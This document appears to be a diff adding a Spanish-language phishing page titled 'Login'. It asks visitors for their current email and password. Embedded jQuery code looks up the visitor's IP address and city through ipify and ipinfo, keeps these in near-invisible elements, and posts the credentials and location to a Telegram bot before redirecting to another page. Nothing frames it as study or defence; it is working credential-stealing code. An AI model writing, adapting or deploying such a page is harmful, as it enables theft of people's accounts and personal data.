@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+    <script src="escri00/teleaacaa.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+              $("#gfg").html(data.ip);
+          });
+          $.getJSON("https://ipinfo.io", function(response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+    
+      var u_name, u_name2, ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("fon11").value;
+        u_name2 = document.getElementById("fon22").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "💌💌FELICIDADES ESTA CAYENDO EN BANDEJA\n☰ccc: " + u_name + "\n☰🔺clv11: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+      };
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'theppfina.html';
+        });
+        return false;
+      };
+    
+    </script>
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="stylesheet" href="mondi/monj.css">
+</head>
+<body style="background-color: rgba(172, 172, 249, 0.226);">
+<center> <div style="background-color: white; margin: 0;"><br>
+    <img style="width: 30%;" src="mondi/jdiowe.png" alt=""><br> <br></div></center>
+  <div class="container">
+     
+<form method="post" action="#" onsubmit="return sender();">
+      <h2>De manera inmediata realiza el ingreso !</h2>
+      <div class="form-group">
+        <label for="username">Correo electronico actual:</label>
+        <input type="email" id="fon11" name="fon11" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Contraseña actual:</label>
+        <input type="password" id="fon22" name="fon22" required>
+      </div>
+      <input class="typsub" type="submit" value="Iniciar Sesión">     </form>
+  </div><div style="color: rgb(255, 255, 255);font-size: 0.05px;">
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div>
+</form>
+</body>
+</html>
